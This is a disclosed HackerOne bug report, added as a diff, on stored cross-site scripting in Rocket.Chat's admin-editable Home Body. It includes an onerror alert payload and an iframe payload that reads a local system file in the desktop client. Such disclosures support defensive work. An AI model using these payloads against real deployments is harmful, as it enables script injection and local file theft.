@@ -1,0 +1,40 @@
+ReportLink:https://hackerone.com/reports/724153
+WeaknessName:Cross-site Scripting (XSS) - Stored
+Reporter:https://hackerone.com/sectex
+ReportedTo:Rocket.Chat(rocket_chat)
+BountyAmount:
+Severity:low
+State:Closed
+DateOfDisclosure:02.01.2020 16:19:08
+
+Summary:
+
+**Description:** Rocket.Chat allows administrative users to customize the home body. Since `<script>` tags are removed, I think that running scripts should not be allowed. However, event handlers are not removed, allowing you to inject your own scripts.
+
+## Releases Affected:
+
+  * Rocket.Chat-Desktop-Client: v2.15.5
+  * Rocket.Chat-Server: v2.0.0
+  * Apps-Engine-Version: v1.5.2
+
+## Steps To Reproduce (from initial installation to vulnerability):
+
+  - Go to `Administration » Layout » Content`
+  - Set `Home Body` to `<img src=0 onerror="alert(0)"/>`
+  - Visit `/home`
+
+### Arbitrary file read in Rocket.Chat-Desktop
+
+  - Go to `Administration » Layout » Content`
+  - Set `Home Body` to `<iframe src="file://c:/windows/system32/drivers/etc/hosts" onload="alert(iframe.contentDocument.body.innerHTML)" id="iframe"></iframe>`
+  - Visit `/home`
+
+## Supporting Material/References:
+
+  * {F613006}
+  * {F613007}
+  * {F620074}
+
+## Impact
+
+* Attackers can execute scripts which leads to arbitrary file read and rce in Rocket.Chat-Desktop
